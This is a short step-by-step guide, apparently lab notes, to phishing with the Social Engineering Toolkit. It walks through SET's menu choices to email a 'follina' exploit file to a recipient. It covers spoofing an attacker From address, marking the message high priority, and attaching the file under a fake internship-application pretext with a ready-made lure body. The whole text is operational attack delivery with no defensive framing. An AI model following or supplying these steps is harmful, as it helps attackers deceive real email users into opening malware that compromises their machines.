Use Social Engineering Toolkit (SET) to send follina file to receiver using email.

1. **Run as root to use SET.**
```
sudo setoolkit
```

2. **Select Social-Engineering Attacks.**
```
1
```

3. **Select to send malicious file by email.**
```
5
```

4. **Enter "yes" to start the process to send email.**
```
yes
```

5. **Enter 1 to select email to send to.**
```
1
```

6. **Enter receiver email.**
```
example@gmail.com
```

7. **Enter 2 to select own server or open relay.**
```
2
```

8. **Enter attacker email as From address and name as From name.**
```
attacker@gmail.com
attacker
```

9. **Enter y to flag the email as high priority.**
```
y
```

10. **Enter y to add an attachment.**
```
y
```

11. **Enter path to the follina file from kali side.**

12. **Enter n regarding adding an inline attachment.**
```
n
```

13. **Enter Email Subject and press ENTER.**
```
Internship
```

14. **Enter h to send this email in HTML format.**
```
h
```

15. **Type body of the message email**
```
Hello, my name is ... I want to take an internship at ... here is the file regarding internship.
```

16. **Type "END" to finish**
```
END
```
